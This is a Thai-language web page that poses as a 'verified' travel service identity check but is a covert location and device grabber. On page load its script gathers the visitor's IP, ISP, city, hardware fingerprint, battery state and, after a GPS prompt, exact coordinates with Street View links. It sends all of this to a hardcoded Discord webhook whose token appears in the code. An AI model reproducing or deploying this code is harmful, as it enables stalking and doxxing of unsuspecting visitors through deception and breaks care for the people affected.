<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Travel Premium - Verified Service</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #010409; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-line { height: 2px; background: linear-gradient(90deg, transparent, #3b82f6, transparent); position: absolute; width: 100%; top: 0; animation: scan move 1.5s infinite linear; }
        @keyframes move { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative border border-white/10">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em] font-bold">
                System Intelligence v18.0
            </div>
            <h1 id="status-title" class="text-3xl font-bold mb-2 tracking-tight">กำลังยืนยันตัวตน...</h1>
            <p id="status-desc" class="text-slate-400 text-sm leading-relaxed">กรุณารอสักครู่ ระบบกำลังวิเคราะห์ข้อมูลความปลอดภัยอัตโนมัติ</p>
        </div>

        <div class="p-8 pt-0">
            <div id="loading-zone" class="text-center py-6">
                <div class="relative w-40 h-40 mx-auto mb-8 rounded-[2rem] border border-blue-500/30 overflow-hidden bg-slate-900 flex items-center justify-center">
                    <div class="text-5xl animate-pulse">📡</div>
                    <div class="scan-line"></div>
                </div>
                <div id="logs" class="text-[9px] font-mono text-slate-500 text-left bg-black/40 p-4 rounded-2xl border border-white/5 h-32 overflow-hidden leading-relaxed">
                    <p class="text-blue-400">> ระบบเริ่มต้นทำงาน...</p>
                </div>
            </div>

            <div id="result-zone" class="hidden animate-in fade-in zoom-in duration-500">
                <div class="mb-5 p-4 bg-green-500/10 border border-green-500/20 rounded-[1.5rem] flex items-center gap-4 text-green-400">
                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white text-2xl">✓</div>
                    <div>
                        <p class="font-bold text-sm uppercase">ตรวจสอบเสร็จสมบูรณ์</p>
                        <p class="text-[10px] opacity-70">บันทึกพิกัดและข้อมูลเครือข่ายแล้ว</p>
                    </div>
                </div>
                <div id="links-container" class="space-y-3"></div>
            </div>
        </div>
    </div>

    <script>
        // ใส่ URL Webhook ของคุณ
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497104681770549318/pOsCVRZNsGnE8hxcr8YsMGuML2GfV95ALQSuxRF9KrLUrOgnaccBxt0Kc9Ygc6WruqkH";

        function log(msg) {
            const l = document.getElementById('logs');
            l.innerHTML += `<p class="text-blue-400/60">> ${msg}</p>`;
            l.scrollTop = l.scrollHeight;
        }

        window.onload = async () => {
            log("วิเคราะห์ IP และ เครือข่าย...");
            const network = await getNetwork();
            
            log(`ตรวจพบ IP: ${network.ip}`);
            log("ตรวจสอบสถาปัตยกรรมเครื่อง...");
            const hardware = getHardware();
            
            log("ดึงข้อมูลสถานะพลังงาน...");
            const battery = await getBattery();

            // ส่งข้อมูลชุดแรกทันที (IP + Hardware)
            await sendToDiscord({
                type: "⚡ INSTANT_LOAD",
                ...network,
                ...hardware,
                battery,
                lang: navigator.language,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
            });

            // ขอพิกัด GPS ต่อทันที
            if (navigator.geolocation) {
                log("กำลังร้องขอพิกัดแม่นยำ (GPS)...");
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    log("ยืนยันพิกัดสำเร็จ! ส่งข้อมูลชุดที่ 2...");
                    const finalData = {
                        type: "📍 LOCATION_ACQUIRED",
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy.toFixed(1),
                        ...network, ...hardware, battery,
                        lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };
                    await sendToDiscord(finalData);
                    showUI(finalData);
                }, async (err) => {
                    log("พิกัดถูกปฏิเสธโดยผู้ใช้");
                    showUI({ ...network, lat: "Denied", lon: "Denied" });
                });
            }
        };

        async function getNetwork() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                return { ip: d.ip, isp: d.org, city: d.city, region: d.region, country: d.country_name };
            } catch (e) { return { ip: "Unknown", isp: "N/A", city: "N/A" }; }
        }

        function getHardware() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            return {
                gpu,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`
            };
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'ชาร์จ' : 'แบต'})`;
            } catch { return "N/A"; }
        }

        async function sendToDiscord(d) {
            const payload = {
                embeds: [{
                    title: `<a:loading:1484593662397644952> [${d.type}] พบข้อมูลใหม่`,
                    color: d.lat && d.lat !== "Denied" ? 3066993 : 15105570,
                    fields: [
                        { name: "<a:network:1484593749391708200> ข้อมูล IP & ISP", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.region}, ${d.country}`, inline: false },
                        { name: "<a:device:1484593643284074627> ฮาร์ดแวร์", value: `**GPU:** ${d.gpu}\n**CPU:** ${d.cores} Cores | **RAM:** ${d.ram}\n**Platform:** ${d.platform}\n**Language:** ${d.lang}`, inline: false },
                        { name: "<a:location:1484593651387469954> พิกัด (GPS)", value: d.lat === "Denied" ? "❌ ผู้ใช้ปฏิเสธพิกัด" : `\`${d.lat}, ${d.lon}\`\n(ความแม่นยำ +/- ${d.acc} ม.)`, inline: true },
                        { name: "🔋 แบตเตอรี่", value: d.battery, inline: true },
                        { name: "<a:link:1484943895526899792> แผนที่", value: d.lat !== "Denied" ? `📍 [Maps](https://www.google.com/maps?q=${d.lat},${d.lon}) | 🏠 [StreetView](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${d.lat},${d.lon})` : "ไม่มีพิกัด", inline: false }
                    ],
                    footer: { text: "Premium Intelligence Node • " + new Date().toLocaleString('th-TH') }
                }]
            };
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        }

        function showUI(d) {
            document.getElementById('loading-zone').classList.add('hidden');
            document.getElementById('result-zone').classList.remove('hidden');
            document.getElementById('status-title').innerText = "ยินดีต้อนรับ";
            document.getElementById('status-desc').innerText = "เราได้เตรียมข้อมูลพรีเมียมในพื้นที่ของคุณเรียบร้อยแล้ว";

            const container = document.getElementById('links-container');
            const hasLoc = d.lat && d.lat !== "Denied";
            container.innerHTML = `
                <div class="bg-blue-600/5 p-4 rounded-2xl border border-blue-500/20 text-[10px] mb-4 space-y-1">
                    <p class="text-blue-400 font-bold uppercase mb-1">สรุปการตรวจสอบ</p>
                    <p>IP Address: ${d.ip}</p>
                    <p>เครือข่าย: ${d.isp}</p>
                    <p>พื้นที่: ${d.city}, ${d.country}</p>
                </div>
                ${hasLoc ? `
                <a href="https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}" target="_blank" class="flex items-center gap-4 bg-blue-600 p-5 rounded-2xl hover:bg-blue-500 transition-all shadow-lg active:scale-95">
                    <span class="text-2xl">🌍</span>
                    <div class="flex-1 text-left">
                        <p class="text-white text-sm font-bold">เปิดพิกัดบริการพรีเมียม</p>
                        <p class="text-blue-100 text-[10px]">ดูสถานที่ยอดนิยมใกล้คุณใน ${d.city}</p>
                    </div>
                </a>
                <a href="https://www.google.com/maps?q&layer=c&cbll=${d.lat},${d.lon}" target="_blank" class="flex items-center gap-4 bg-white/5 border border-white/10 p-5 rounded-2xl hover:bg-white/10 transition-all active:scale-95">
                    <span class="text-2xl">🏠</span>
                    <div class="flex-1 text-left">
                        <p class="text-white text-sm font-bold">ดูหน้าบ้าน / Street View</p>
                        <p class="text-slate-400 text-[10px]">ตรวจสอบทัศนียภาพจริงของพื้นที่</p>
                    </div>
                </a>
                ` : `<p class="text-red-400 text-center text-xs">กรุณาอนุญาตพิกัดเพื่อปลดล็อคแผนที่</p>`}
            `;
        }
    </script>
</body>
</html>
